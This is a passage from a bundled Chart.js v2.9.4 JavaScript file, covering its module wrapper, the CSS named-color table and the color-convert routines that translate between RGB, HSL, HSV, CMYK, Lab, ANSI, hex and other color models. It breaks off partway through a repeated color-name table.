// -------------------------------  chartjs
/*!
 * Chart.js v2.9.4
 * https://www.chartjs.org
 * (c) 2020 Chart.js Contributors
 * Released under the MIT License
 */
(function (global, factory) {
  typeof exports === "object" && typeof module !== "undefined"
    ? (module.exports = factory(
        (function () {
          try {
            return require("moment");
          } catch (e) {}
        })()
      ))
    : typeof define === "function" && define.amd
    ? define(["require"], function (require) {
        return factory(
          (function () {
            try {
              return require("moment");
            } catch (e) {}
          })()
        );
      })
    : ((global = global || self), (global.Chart = factory(global.moment)));
})(this, function (moment) {
  "use strict";

  moment =
    moment && moment.hasOwnProperty("default") ? moment["default"] : moment;

  function createCommonjsModule(fn, module) {
    return (
      (module = { exports: {} }), fn(module, module.exports), module.exports
    );
  }

  function getCjsExportFromNamespace(n) {
    return (n && n["default"]) || n;
  }

  var colorName = {
    aliceblue: [240, 248, 255],
    antiquewhite: [250, 235, 215],
    aqua: [0, 255, 255],
    aquamarine: [127, 255, 212],
    azure: [240, 255, 255],
    beige: [245, 245, 220],
    bisque: [255, 228, 196],
    black: [0, 0, 0],
    blanchedalmond: [255, 235, 205],
    blue: [0, 0, 255],
    blueviolet: [138, 43, 226],
    brown: [165, 42, 42],
    burlywood: [222, 184, 135],
    cadetblue: [95, 158, 160],
    chartreuse: [127, 255, 0],
    chocolate: [210, 105, 30],
    coral: [255, 127, 80],
    cornflowerblue: [100, 149, 237],
    cornsilk: [255, 248, 220],
    crimson: [220, 20, 60],
    cyan: [0, 255, 255],
    darkblue: [0, 0, 139],
    darkcyan: [0, 139, 139],
    darkgoldenrod: [184, 134, 11],
    darkgray: [169, 169, 169],
    darkgreen: [0, 100, 0],
    darkgrey: [169, 169, 169],
    darkkhaki: [189, 183, 107],
    darkmagenta: [139, 0, 139],
    darkolivegreen: [85, 107, 47],
    darkorange: [255, 140, 0],
    darkorchid: [153, 50, 204],
    darkred: [139, 0, 0],
    darksalmon: [233, 150, 122],
    darkseagreen: [143, 188, 143],
    darkslateblue: [72, 61, 139],
    darkslategray: [47, 79, 79],
    darkslategrey: [47, 79, 79],
    darkturquoise: [0, 206, 209],
    darkviolet: [148, 0, 211],
    deeppink: [255, 20, 147],
    deepskyblue: [0, 191, 255],
    dimgray: [105, 105, 105],
    dimgrey: [105, 105, 105],
    dodgerblue: [30, 144, 255],
    firebrick: [178, 34, 34],
    floralwhite: [255, 250, 240],
    forestgreen: [34, 139, 34],
    fuchsia: [255, 0, 255],
    gainsboro: [220, 220, 220],
    ghostwhite: [248, 248, 255],
    gold: [255, 215, 0],
    goldenrod: [218, 165, 32],
    gray: [128, 128, 128],
    green: [0, 128, 0],
    greenyellow: [173, 255, 47],
    grey: [128, 128, 128],
    honeydew: [240, 255, 240],
    hotpink: [255, 105, 180],
    indianred: [205, 92, 92],
    indigo: [75, 0, 130],
    ivory: [255, 255, 240],
    khaki: [240, 230, 140],
    lavender: [230, 230, 250],
    lavenderblush: [255, 240, 245],
    lawngreen: [124, 252, 0],
    lemonchiffon: [255, 250, 205],
    lightblue: [173, 216, 230],
    lightcoral: [240, 128, 128],
    lightcyan: [224, 255, 255],
    lightgoldenrodyellow: [250, 250, 210],
    lightgray: [211, 211, 211],
    lightgreen: [144, 238, 144],
    lightgrey: [211, 211, 211],
    lightpink: [255, 182, 193],
    lightsalmon: [255, 160, 122],
    lightseagreen: [32, 178, 170],
    lightskyblue: [135, 206, 250],
    lightslategray: [119, 136, 153],
    lightslategrey: [119, 136, 153],
    lightsteelblue: [176, 196, 222],
    lightyellow: [255, 255, 224],
    lime: [0, 255, 0],
    limegreen: [50, 205, 50],
    linen: [250, 240, 230],
    magenta: [255, 0, 255],
    maroon: [128, 0, 0],
    mediumaquamarine: [102, 205, 170],
    mediumblue: [0, 0, 205],
    mediumorchid: [186, 85, 211],
    mediumpurple: [147, 112, 219],
    mediumseagreen: [60, 179, 113],
    mediumslateblue: [123, 104, 238],
    mediumspringgreen: [0, 250, 154],
    mediumturquoise: [72, 209, 204],
    mediumvioletred: [199, 21, 133],
    midnightblue: [25, 25, 112],
    mintcream: [245, 255, 250],
    mistyrose: [255, 228, 225],
    moccasin: [255, 228, 181],
    navajowhite: [255, 222, 173],
    navy: [0, 0, 128],
    oldlace: [253, 245, 230],
    olive: [128, 128, 0],
    olivedrab: [107, 142, 35],
    orange: [255, 165, 0],
    orangered: [255, 69, 0],
    orchid: [218, 112, 214],
    palegoldenrod: [238, 232, 170],
    palegreen: [152, 251, 152],
    paleturquoise: [175, 238, 238],
    palevioletred: [219, 112, 147],
    papayawhip: [255, 239, 213],
    peachpuff: [255, 218, 185],
    peru: [205, 133, 63],
    pink: [255, 192, 203],
    plum: [221, 160, 221],
    powderblue: [176, 224, 230],
    purple: [128, 0, 128],
    rebeccapurple: [102, 51, 153],
    red: [255, 0, 0],
    rosybrown: [188, 143, 143],
    royalblue: [65, 105, 225],
    saddlebrown: [139, 69, 19],
    salmon: [250, 128, 114],
    sandybrown: [244, 164, 96],
    seagreen: [46, 139, 87],
    seashell: [255, 245, 238],
    sienna: [160, 82, 45],
    silver: [192, 192, 192],
    skyblue: [135, 206, 235],
    slateblue: [106, 90, 205],
    slategray: [112, 128, 144],
    slategrey: [112, 128, 144],
    snow: [255, 250, 250],
    springgreen: [0, 255, 127],
    steelblue: [70, 130, 180],
    tan: [210, 180, 140],
    teal: [0, 128, 128],
    thistle: [216, 191, 216],
    tomato: [255, 99, 71],
    turquoise: [64, 224, 208],
    violet: [238, 130, 238],
    wheat: [245, 222, 179],
    white: [255, 255, 255],
    whitesmoke: [245, 245, 245],
    yellow: [255, 255, 0],
    yellowgreen: [154, 205, 50],
  };

  var conversions = createCommonjsModule(function (module) {
    /* MIT license */

    // NOTE: conversions should only return primitive values (i.e. arrays, or
    //       values that give correct `typeof` results).
    //       do not use box values types (i.e. Number(), String(), etc.)

    var reverseKeywords = {};
    for (var key in colorName) {
      if (colorName.hasOwnProperty(key)) {
        reverseKeywords[colorName[key]] = key;
      }
    }

    var convert = (module.exports = {
      rgb: { channels: 3, labels: "rgb" },
      hsl: { channels: 3, labels: "hsl" },
      hsv: { channels: 3, labels: "hsv" },
      hwb: { channels: 3, labels: "hwb" },
      cmyk: { channels: 4, labels: "cmyk" },
      xyz: { channels: 3, labels: "xyz" },
      lab: { channels: 3, labels: "lab" },
      lch: { channels: 3, labels: "lch" },
      hex: { channels: 1, labels: ["hex"] },
      keyword: { channels: 1, labels: ["keyword"] },
      ansi16: { channels: 1, labels: ["ansi16"] },
      ansi256: { channels: 1, labels: ["ansi256"] },
      hcg: { channels: 3, labels: ["h", "c", "g"] },
      apple: { channels: 3, labels: ["r16", "g16", "b16"] },
      gray: { channels: 1, labels: ["gray"] },
    });

    // hide .channels and .labels properties
    for (var model in convert) {
      if (convert.hasOwnProperty(model)) {
        if (!("channels" in convert[model])) {
          throw new Error("missing channels property: " + model);
        }

        if (!("labels" in convert[model])) {
          throw new Error("missing channel labels property: " + model);
        }

        if (convert[model].labels.length !== convert[model].channels) {
          throw new Error("channel and label counts mismatch: " + model);
        }

        var channels = convert[model].channels;
        var labels = convert[model].labels;
        delete convert[model].channels;
        delete convert[model].labels;
        Object.defineProperty(convert[model], "channels", { value: channels });
        Object.defineProperty(convert[model], "labels", { value: labels });
      }
    }

    convert.rgb.hsl = function (rgb) {
      var r = rgb[0] / 255;
      var g = rgb[1] / 255;
      var b = rgb[2] / 255;
      var min = Math.min(r, g, b);
      var max = Math.max(r, g, b);
      var delta = max - min;
      var h;
      var s;
      var l;

      if (max === min) {
        h = 0;
      } else if (r === max) {
        h = (g - b) / delta;
      } else if (g === max) {
        h = 2 + (b - r) / delta;
      } else if (b === max) {
        h = 4 + (r - g) / delta;
      }

      h = Math.min(h * 60, 360);

      if (h < 0) {
        h += 360;
      }

      l = (min + max) / 2;

      if (max === min) {
        s = 0;
      } else if (l <= 0.5) {
        s = delta / (max + min);
      } else {
        s = delta / (2 - max - min);
      }

      return [h, s * 100, l * 100];
    };

    convert.rgb.hsv = function (rgb) {
      var rdif;
      var gdif;
      var bdif;
      var h;
      var s;

      var r = rgb[0] / 255;
      var g = rgb[1] / 255;
      var b = rgb[2] / 255;
      var v = Math.max(r, g, b);
      var diff = v - Math.min(r, g, b);
      var diffc = function (c) {
        return (v - c) / 6 / diff + 1 / 2;
      };

      if (diff === 0) {
        h = s = 0;
      } else {
        s = diff / v;
        rdif = diffc(r);
        gdif = diffc(g);
        bdif = diffc(b);

        if (r === v) {
          h = bdif - gdif;
        } else if (g === v) {
          h = 1 / 3 + rdif - bdif;
        } else if (b === v) {
          h = 2 / 3 + gdif - rdif;
        }
        if (h < 0) {
          h += 1;
        } else if (h > 1) {
          h -= 1;
        }
      }

      return [h * 360, s * 100, v * 100];
    };

    convert.rgb.hwb = function (rgb) {
      var r = rgb[0];
      var g = rgb[1];
      var b = rgb[2];
      var h = convert.rgb.hsl(rgb)[0];
      var w = (1 / 255) * Math.min(r, Math.min(g, b));

      b = 1 - (1 / 255) * Math.max(r, Math.max(g, b));

      return [h, w * 100, b * 100];
    };

    convert.rgb.cmyk = function (rgb) {
      var r = rgb[0] / 255;
      var g = rgb[1] / 255;
      var b = rgb[2] / 255;
      var c;
      var m;
      var y;
      var k;

      k = Math.min(1 - r, 1 - g, 1 - b);
      c = (1 - r - k) / (1 - k) || 0;
      m = (1 - g - k) / (1 - k) || 0;
      y = (1 - b - k) / (1 - k) || 0;

      return [c * 100, m * 100, y * 100, k * 100];
    };

    /**
     * See https://en.m.wikipedia.org/wiki/Euclidean_distance#Squared_Euclidean_distance
     * */
    function comparativeDistance(x, y) {
      return (
        Math.pow(x[0] - y[0], 2) +
        Math.pow(x[1] - y[1], 2) +
        Math.pow(x[2] - y[2], 2)
      );
    }

    convert.rgb.keyword = function (rgb) {
      var reversed = reverseKeywords[rgb];
      if (reversed) {
        return reversed;
      }

      var currentClosestDistance = Infinity;
      var currentClosestKeyword;

      for (var keyword in colorName) {
        if (colorName.hasOwnProperty(keyword)) {
          var value = colorName[keyword];

          // Compute comparative distance
          var distance = comparativeDistance(rgb, value);

          // Check if its less, if so set as closest
          if (distance < currentClosestDistance) {
            currentClosestDistance = distance;
            currentClosestKeyword = keyword;
          }
        }
      }

      return currentClosestKeyword;
    };

    convert.keyword.rgb = function (keyword) {
      return colorName[keyword];
    };

    convert.rgb.xyz = function (rgb) {
      var r = rgb[0] / 255;
      var g = rgb[1] / 255;
      var b = rgb[2] / 255;

      // assume sRGB
      r = r > 0.04045 ? Math.pow((r + 0.055) / 1.055, 2.4) : r / 12.92;
      g = g > 0.04045 ? Math.pow((g + 0.055) / 1.055, 2.4) : g / 12.92;
      b = b > 0.04045 ? Math.pow((b + 0.055) / 1.055, 2.4) : b / 12.92;

      var x = r * 0.4124 + g * 0.3576 + b * 0.1805;
      var y = r * 0.2126 + g * 0.7152 + b * 0.0722;
      var z = r * 0.0193 + g * 0.1192 + b * 0.9505;

      return [x * 100, y * 100, z * 100];
    };

    convert.rgb.lab = function (rgb) {
      var xyz = convert.rgb.xyz(rgb);
      var x = xyz[0];
      var y = xyz[1];
      var z = xyz[2];
      var l;
      var a;
      var b;

      x /= 95.047;
      y /= 100;
      z /= 108.883;

      x = x > 0.008856 ? Math.pow(x, 1 / 3) : 7.787 * x + 16 / 116;
      y = y > 0.008856 ? Math.pow(y, 1 / 3) : 7.787 * y + 16 / 116;
      z = z > 0.008856 ? Math.pow(z, 1 / 3) : 7.787 * z + 16 / 116;

      l = 116 * y - 16;
      a = 500 * (x - y);
      b = 200 * (y - z);

      return [l, a, b];
    };

    convert.hsl.rgb = function (hsl) {
      var h = hsl[0] / 360;
      var s = hsl[1] / 100;
      var l = hsl[2] / 100;
      var t1;
      var t2;
      var t3;
      var rgb;
      var val;

      if (s === 0) {
        val = l * 255;
        return [val, val, val];
      }

      if (l < 0.5) {
        t2 = l * (1 + s);
      } else {
        t2 = l + s - l * s;
      }

      t1 = 2 * l - t2;

      rgb = [0, 0, 0];
      for (var i = 0; i < 3; i++) {
        t3 = h + (1 / 3) * -(i - 1);
        if (t3 < 0) {
          t3++;
        }
        if (t3 > 1) {
          t3--;
        }

        if (6 * t3 < 1) {
          val = t1 + (t2 - t1) * 6 * t3;
        } else if (2 * t3 < 1) {
          val = t2;
        } else if (3 * t3 < 2) {
          val = t1 + (t2 - t1) * (2 / 3 - t3) * 6;
        } else {
          val = t1;
        }

        rgb[i] = val * 255;
      }

      return rgb;
    };

    convert.hsl.hsv = function (hsl) {
      var h = hsl[0];
      var s = hsl[1] / 100;
      var l = hsl[2] / 100;
      var smin = s;
      var lmin = Math.max(l, 0.01);
      var sv;
      var v;

      l *= 2;
      s *= l <= 1 ? l : 2 - l;
      smin *= lmin <= 1 ? lmin : 2 - lmin;
      v = (l + s) / 2;
      sv = l === 0 ? (2 * smin) / (lmin + smin) : (2 * s) / (l + s);

      return [h, sv * 100, v * 100];
    };

    convert.hsv.rgb = function (hsv) {
      var h = hsv[0] / 60;
      var s = hsv[1] / 100;
      var v = hsv[2] / 100;
      var hi = Math.floor(h) % 6;

      var f = h - Math.floor(h);
      var p = 255 * v * (1 - s);
      var q = 255 * v * (1 - s * f);
      var t = 255 * v * (1 - s * (1 - f));
      v *= 255;

      switch (hi) {
        case 0:
          return [v, t, p];
        case 1:
          return [q, v, p];
        case 2:
          return [p, v, t];
        case 3:
          return [p, q, v];
        case 4:
          return [t, p, v];
        case 5:
          return [v, p, q];
      }
    };

    convert.hsv.hsl = function (hsv) {
      var h = hsv[0];
      var s = hsv[1] / 100;
      var v = hsv[2] / 100;
      var vmin = Math.max(v, 0.01);
      var lmin;
      var sl;
      var l;

      l = (2 - s) * v;
      lmin = (2 - s) * vmin;
      sl = s * vmin;
      sl /= lmin <= 1 ? lmin : 2 - lmin;
      sl = sl || 0;
      l /= 2;

      return [h, sl * 100, l * 100];
    };

    // http://dev.w3.org/csswg/css-color/#hwb-to-rgb
    convert.hwb.rgb = function (hwb) {
      var h = hwb[0] / 360;
      var wh = hwb[1] / 100;
      var bl = hwb[2] / 100;
      var ratio = wh + bl;
      var i;
      var v;
      var f;
      var n;

      // wh + bl cant be > 1
      if (ratio > 1) {
        wh /= ratio;
        bl /= ratio;
      }

      i = Math.floor(6 * h);
      v = 1 - bl;
      f = 6 * h - i;

      if ((i & 0x01) !== 0) {
        f = 1 - f;
      }

      n = wh + f * (v - wh); // linear interpolation

      var r;
      var g;
      var b;
      switch (i) {
        default:
        case 6:
        case 0:
          r = v;
          g = n;
          b = wh;
          break;
        case 1:
          r = n;
          g = v;
          b = wh;
          break;
        case 2:
          r = wh;
          g = v;
          b = n;
          break;
        case 3:
          r = wh;
          g = n;
          b = v;
          break;
        case 4:
          r = n;
          g = wh;
          b = v;
          break;
        case 5:
          r = v;
          g = wh;
          b = n;
          break;
      }

      return [r * 255, g * 255, b * 255];
    };

    convert.cmyk.rgb = function (cmyk) {
      var c = cmyk[0] / 100;
      var m = cmyk[1] / 100;
      var y = cmyk[2] / 100;
      var k = cmyk[3] / 100;
      var r;
      var g;
      var b;

      r = 1 - Math.min(1, c * (1 - k) + k);
      g = 1 - Math.min(1, m * (1 - k) + k);
      b = 1 - Math.min(1, y * (1 - k) + k);

      return [r * 255, g * 255, b * 255];
    };

    convert.xyz.rgb = function (xyz) {
      var x = xyz[0] / 100;
      var y = xyz[1] / 100;
      var z = xyz[2] / 100;
      var r;
      var g;
      var b;

      r = x * 3.2406 + y * -1.5372 + z * -0.4986;
      g = x * -0.9689 + y * 1.8758 + z * 0.0415;
      b = x * 0.0557 + y * -0.204 + z * 1.057;

      // assume sRGB
      r = r > 0.0031308 ? 1.055 * Math.pow(r, 1.0 / 2.4) - 0.055 : r * 12.92;

      g = g > 0.0031308 ? 1.055 * Math.pow(g, 1.0 / 2.4) - 0.055 : g * 12.92;

      b = b > 0.0031308 ? 1.055 * Math.pow(b, 1.0 / 2.4) - 0.055 : b * 12.92;

      r = Math.min(Math.max(0, r), 1);
      g = Math.min(Math.max(0, g), 1);
      b = Math.min(Math.max(0, b), 1);

      return [r * 255, g * 255, b * 255];
    };

    convert.xyz.lab = function (xyz) {
      var x = xyz[0];
      var y = xyz[1];
      var z = xyz[2];
      var l;
      var a;
      var b;

      x /= 95.047;
      y /= 100;
      z /= 108.883;

      x = x > 0.008856 ? Math.pow(x, 1 / 3) : 7.787 * x + 16 / 116;
      y = y > 0.008856 ? Math.pow(y, 1 / 3) : 7.787 * y + 16 / 116;
      z = z > 0.008856 ? Math.pow(z, 1 / 3) : 7.787 * z + 16 / 116;

      l = 116 * y - 16;
      a = 500 * (x - y);
      b = 200 * (y - z);

      return [l, a, b];
    };

    convert.lab.xyz = function (lab) {
      var l = lab[0];
      var a = lab[1];
      var b = lab[2];
      var x;
      var y;
      var z;

      y = (l + 16) / 116;
      x = a / 500 + y;
      z = y - b / 200;

      var y2 = Math.pow(y, 3);
      var x2 = Math.pow(x, 3);
      var z2 = Math.pow(z, 3);
      y = y2 > 0.008856 ? y2 : (y - 16 / 116) / 7.787;
      x = x2 > 0.008856 ? x2 : (x - 16 / 116) / 7.787;
      z = z2 > 0.008856 ? z2 : (z - 16 / 116) / 7.787;

      x *= 95.047;
      y *= 100;
      z *= 108.883;

      return [x, y, z];
    };

    convert.lab.lch = function (lab) {
      var l = lab[0];
      var a = lab[1];
      var b = lab[2];
      var hr;
      var h;
      var c;

      hr = Math.atan2(b, a);
      h = (hr * 360) / 2 / Math.PI;

      if (h < 0) {
        h += 360;
      }

      c = Math.sqrt(a * a + b * b);

      return [l, c, h];
    };

    convert.lch.lab = function (lch) {
      var l = lch[0];
      var c = lch[1];
      var h = lch[2];
      var a;
      var b;
      var hr;

      hr = (h / 360) * 2 * Math.PI;
      a = c * Math.cos(hr);
      b = c * Math.sin(hr);

      return [l, a, b];
    };

    convert.rgb.ansi16 = function (args) {
      var r = args[0];
      var g = args[1];
      var b = args[2];
      var value = 1 in arguments ? arguments[1] : convert.rgb.hsv(args)[2]; // hsv -> ansi16 optimization

      value = Math.round(value / 50);

      if (value === 0) {
        return 30;
      }

      var ansi =
        30 +
        ((Math.round(b / 255) << 2) |
          (Math.round(g / 255) << 1) |
          Math.round(r / 255));

      if (value === 2) {
        ansi += 60;
      }

      return ansi;
    };

    convert.hsv.ansi16 = function (args) {
      // optimization here; we already know the value and don't need to get
      // it converted for us.
      return convert.rgb.ansi16(convert.hsv.rgb(args), args[2]);
    };

    convert.rgb.ansi256 = function (args) {
      var r = args[0];
      var g = args[1];
      var b = args[2];

      // we use the extended greyscale palette here, with the exception of
      // black and white. normal palette only has 4 greyscale shades.
      if (r === g && g === b) {
        if (r < 8) {
          return 16;
        }

        if (r > 248) {
          return 231;
        }

        return Math.round(((r - 8) / 247) * 24) + 232;
      }

      var ansi =
        16 +
        36 * Math.round((r / 255) * 5) +
        6 * Math.round((g / 255) * 5) +
        Math.round((b / 255) * 5);

      return ansi;
    };

    convert.ansi16.rgb = function (args) {
      var color = args % 10;

      // handle greyscale
      if (color === 0 || color === 7) {
        if (args > 50) {
          color += 3.5;
        }

        color = (color / 10.5) * 255;

        return [color, color, color];
      }

      var mult = (~~(args > 50) + 1) * 0.5;
      var r = (color & 1) * mult * 255;
      var g = ((color >> 1) & 1) * mult * 255;
      var b = ((color >> 2) & 1) * mult * 255;

      return [r, g, b];
    };

    convert.ansi256.rgb = function (args) {
      // handle greyscale
      if (args >= 232) {
        var c = (args - 232) * 10 + 8;
        return [c, c, c];
      }

      args -= 16;

      var rem;
      var r = (Math.floor(args / 36) / 5) * 255;
      var g = (Math.floor((rem = args % 36) / 6) / 5) * 255;
      var b = ((rem % 6) / 5) * 255;

      return [r, g, b];
    };

    convert.rgb.hex = function (args) {
      var integer =
        ((Math.round(args[0]) & 0xff) << 16) +
        ((Math.round(args[1]) & 0xff) << 8) +
        (Math.round(args[2]) & 0xff);

      var string = integer.toString(16).toUpperCase();
      return "000000".substring(string.length) + string;
    };

    convert.hex.rgb = function (args) {
      var match = args.toString(16).match(/[a-f0-9]{6}|[a-f0-9]{3}/i);
      if (!match) {
        return [0, 0, 0];
      }

      var colorString = match[0];

      if (match[0].length === 3) {
        colorString = colorString
          .split("")
          .map(function (char) {
            return char + char;
          })
          .join("");
      }

      var integer = parseInt(colorString, 16);
      var r = (integer >> 16) & 0xff;
      var g = (integer >> 8) & 0xff;
      var b = integer & 0xff;

      return [r, g, b];
    };

    convert.rgb.hcg = function (rgb) {
      var r = rgb[0] / 255;
      var g = rgb[1] / 255;
      var b = rgb[2] / 255;
      var max = Math.max(Math.max(r, g), b);
      var min = Math.min(Math.min(r, g), b);
      var chroma = max - min;
      var grayscale;
      var hue;

      if (chroma < 1) {
        grayscale = min / (1 - chroma);
      } else {
        grayscale = 0;
      }

      if (chroma <= 0) {
        hue = 0;
      } else if (max === r) {
        hue = ((g - b) / chroma) % 6;
      } else if (max === g) {
        hue = 2 + (b - r) / chroma;
      } else {
        hue = 4 + (r - g) / chroma + 4;
      }

      hue /= 6;
      hue %= 1;

      return [hue * 360, chroma * 100, grayscale * 100];
    };

    convert.hsl.hcg = function (hsl) {
      var s = hsl[1] / 100;
      var l = hsl[2] / 100;
      var c = 1;
      var f = 0;

      if (l < 0.5) {
        c = 2.0 * s * l;
      } else {
        c = 2.0 * s * (1.0 - l);
      }

      if (c < 1.0) {
        f = (l - 0.5 * c) / (1.0 - c);
      }

      return [hsl[0], c * 100, f * 100];
    };

    convert.hsv.hcg = function (hsv) {
      var s = hsv[1] / 100;
      var v = hsv[2] / 100;

      var c = s * v;
      var f = 0;

      if (c < 1.0) {
        f = (v - c) / (1 - c);
      }

      return [hsv[0], c * 100, f * 100];
    };

    convert.hcg.rgb = function (hcg) {
      var h = hcg[0] / 360;
      var c = hcg[1] / 100;
      var g = hcg[2] / 100;

      if (c === 0.0) {
        return [g * 255, g * 255, g * 255];
      }

      var pure = [0, 0, 0];
      var hi = (h % 1) * 6;
      var v = hi % 1;
      var w = 1 - v;
      var mg = 0;

      switch (Math.floor(hi)) {
        case 0:
          pure[0] = 1;
          pure[1] = v;
          pure[2] = 0;
          break;
        case 1:
          pure[0] = w;
          pure[1] = 1;
          pure[2] = 0;
          break;
        case 2:
          pure[0] = 0;
          pure[1] = 1;
          pure[2] = v;
          break;
        case 3:
          pure[0] = 0;
          pure[1] = w;
          pure[2] = 1;
          break;
        case 4:
          pure[0] = v;
          pure[1] = 0;
          pure[2] = 1;
          break;
        default:
          pure[0] = 1;
          pure[1] = 0;
          pure[2] = w;
      }

      mg = (1.0 - c) * g;

      return [
        (c * pure[0] + mg) * 255,
        (c * pure[1] + mg) * 255,
        (c * pure[2] + mg) * 255,
      ];
    };

    convert.hcg.hsv = function (hcg) {
      var c = hcg[1] / 100;
      var g = hcg[2] / 100;

      var v = c + g * (1.0 - c);
      var f = 0;

      if (v > 0.0) {
        f = c / v;
      }

      return [hcg[0], f * 100, v * 100];
    };

    convert.hcg.hsl = function (hcg) {
      var c = hcg[1] / 100;
      var g = hcg[2] / 100;

      var l = g * (1.0 - c) + 0.5 * c;
      var s = 0;

      if (l > 0.0 && l < 0.5) {
        s = c / (2 * l);
      } else if (l >= 0.5 && l < 1.0) {
        s = c / (2 * (1 - l));
      }

      return [hcg[0], s * 100, l * 100];
    };

    convert.hcg.hwb = function (hcg) {
      var c = hcg[1] / 100;
      var g = hcg[2] / 100;
      var v = c + g * (1.0 - c);
      return [hcg[0], (v - c) * 100, (1 - v) * 100];
    };

    convert.hwb.hcg = function (hwb) {
      var w = hwb[1] / 100;
      var b = hwb[2] / 100;
      var v = 1 - b;
      var c = v - w;
      var g = 0;

      if (c < 1) {
        g = (v - c) / (1 - c);
      }

      return [hwb[0], c * 100, g * 100];
    };

    convert.apple.rgb = function (apple) {
      return [
        (apple[0] / 65535) * 255,
        (apple[1] / 65535) * 255,
        (apple[2] / 65535) * 255,
      ];
    };

    convert.rgb.apple = function (rgb) {
      return [
        (rgb[0] / 255) * 65535,
        (rgb[1] / 255) * 65535,
        (rgb[2] / 255) * 65535,
      ];
    };

    convert.gray.rgb = function (args) {
      return [
        (args[0] / 100) * 255,
        (args[0] / 100) * 255,
        (args[0] / 100) * 255,
      ];
    };

    convert.gray.hsl = convert.gray.hsv = function (args) {
      return [0, 0, args[0]];
    };

    convert.gray.hwb = function (gray) {
      return [0, 100, gray[0]];
    };

    convert.gray.cmyk = function (gray) {
      return [0, 0, 0, gray[0]];
    };

    convert.gray.lab = function (gray) {
      return [gray[0], 0, 0];
    };

    convert.gray.hex = function (gray) {
      var val = Math.round((gray[0] / 100) * 255) & 0xff;
      var integer = (val << 16) + (val << 8) + val;

      var string = integer.toString(16).toUpperCase();
      return "000000".substring(string.length) + string;
    };

    convert.rgb.gray = function (rgb) {
      var val = (rgb[0] + rgb[1] + rgb[2]) / 3;
      return [(val / 255) * 100];
    };
  });
  var conversions_1 = conversions.rgb;
  var conversions_2 = conversions.hsl;
  var conversions_3 = conversions.hsv;
  var conversions_4 = conversions.hwb;
  var conversions_5 = conversions.cmyk;
  var conversions_6 = conversions.xyz;
  var conversions_7 = conversions.lab;
  var conversions_8 = conversions.lch;
  var conversions_9 = conversions.hex;
  var conversions_10 = conversions.keyword;
  var conversions_11 = conversions.ansi16;
  var conversions_12 = conversions.ansi256;
  var conversions_13 = conversions.hcg;
  var conversions_14 = conversions.apple;
  var conversions_15 = conversions.gray;

  /*
    this function routes a model to all other models.
  
    all functions that are routed have a property `.conversion` attached
    to the returned synthetic function. This property is an array
    of strings, each with the steps in between the 'from' and 'to'
    color models (inclusive).
  
    conversions that are not possible simply are not included.
  */

  function buildGraph() {
    var graph = {};
    // https://jsperf.com/object-keys-vs-for-in-with-closure/3
    var models = Object.keys(conversions);

    for (var len = models.length, i = 0; i < len; i++) {
      graph[models[i]] = {
        // http://jsperf.com/1-vs-infinity
        // micro-opt, but this is simple.
        distance: -1,
        parent: null,
      };
    }

    return graph;
  }

  // https://en.wikipedia.org/wiki/Breadth-first_search
  function deriveBFS(fromModel) {
    var graph = buildGraph();
    var queue = [fromModel]; // unshift -> queue -> pop

    graph[fromModel].distance = 0;

    while (queue.length) {
      var current = queue.pop();
      var adjacents = Object.keys(conversions[current]);

      for (var len = adjacents.length, i = 0; i < len; i++) {
        var adjacent = adjacents[i];
        var node = graph[adjacent];

        if (node.distance === -1) {
          node.distance = graph[current].distance + 1;
          node.parent = current;
          queue.unshift(adjacent);
        }
      }
    }

    return graph;
  }

  function link(from, to) {
    return function (args) {
      return to(from(args));
    };
  }

  function wrapConversion(toModel, graph) {
    var path = [graph[toModel].parent, toModel];
    var fn = conversions[graph[toModel].parent][toModel];

    var cur = graph[toModel].parent;
    while (graph[cur].parent) {
      path.unshift(graph[cur].parent);
      fn = link(conversions[graph[cur].parent][cur], fn);
      cur = graph[cur].parent;
    }

    fn.conversion = path;
    return fn;
  }

  var route = function (fromModel) {
    var graph = deriveBFS(fromModel);
    var conversion = {};

    var models = Object.keys(graph);
    for (var len = models.length, i = 0; i < len; i++) {
      var toModel = models[i];
      var node = graph[toModel];

      if (node.parent === null) {
        // no possible conversion, or this node is the source model.
        continue;
      }

      conversion[toModel] = wrapConversion(toModel, graph);
    }

    return conversion;
  };

  var convert = {};

  var models = Object.keys(conversions);

  function wrapRaw(fn) {
    var wrappedFn = function (args) {
      if (args === undefined || args === null) {
        return args;
      }

      if (arguments.length > 1) {
        args = Array.prototype.slice.call(arguments);
      }

      return fn(args);
    };

    // preserve .conversion property if there is one
    if ("conversion" in fn) {
      wrappedFn.conversion = fn.conversion;
    }

    return wrappedFn;
  }

  function wrapRounded(fn) {
    var wrappedFn = function (args) {
      if (args === undefined || args === null) {
        return args;
      }

      if (arguments.length > 1) {
        args = Array.prototype.slice.call(arguments);
      }

      var result = fn(args);

      // we're assuming the result is an array here.
      // see notice in conversions.js; don't use box types
      // in conversion functions.
      if (typeof result === "object") {
        for (var len = result.length, i = 0; i < len; i++) {
          result[i] = Math.round(result[i]);
        }
      }

      return result;
    };

    // preserve .conversion property if there is one
    if ("conversion" in fn) {
      wrappedFn.conversion = fn.conversion;
    }

    return wrappedFn;
  }

  models.forEach(function (fromModel) {
    convert[fromModel] = {};

    Object.defineProperty(convert[fromModel], "channels", {
      value: conversions[fromModel].channels,
    });
    Object.defineProperty(convert[fromModel], "labels", {
      value: conversions[fromModel].labels,
    });

    var routes = route(fromModel);
    var routeModels = Object.keys(routes);

    routeModels.forEach(function (toModel) {
      var fn = routes[toModel];

      convert[fromModel][toModel] = wrapRounded(fn);
      convert[fromModel][toModel].raw = wrapRaw(fn);
    });
  });

  var colorConvert = convert;

  var colorName$1 = {
    aliceblue: [240, 248, 255],
    antiquewhite: [250, 235, 215],
    aqua: [0, 255, 255],
    aquamarine: [127, 255, 212],
    azure: [240, 255, 255],
    beige: [245, 245, 220],
    bisque: [255, 228, 196],
    black: [0, 0, 0],
    blanchedalmond: [255, 235, 205],
    blue: [0, 0, 255],
    blueviolet: [138, 43, 226],
    brown: [165, 42, 42],
    burlywood: [222, 184, 135],
    cadetblue: [95, 158, 160],
    chartreuse: [127, 255, 0],
    chocolate: [210, 105, 30],
    coral: [255, 127, 80],
    cornflowerblue: [100, 149, 237],
    cornsilk: [255, 248, 220],
    crimson: [220, 20, 60],
    cyan: [0, 255, 255],
    darkblue: [0, 0, 139],
    darkcyan: [0, 139, 139],
    darkgoldenrod: [184, 134, 11],
    darkgray: [169, 169, 169],
    darkgreen: [0, 100, 0],
    darkgrey: [169, 169, 169],
    darkkhaki: [189, 183, 107],
    darkmagenta: [139, 0, 139],
    darkolivegreen: [85, 107, 47],
    darkorange: [255, 140, 0],
    darkorchid: [153, 50, 204],
    darkred: [139, 0, 0],
    darksalmon: [233, 150, 122],
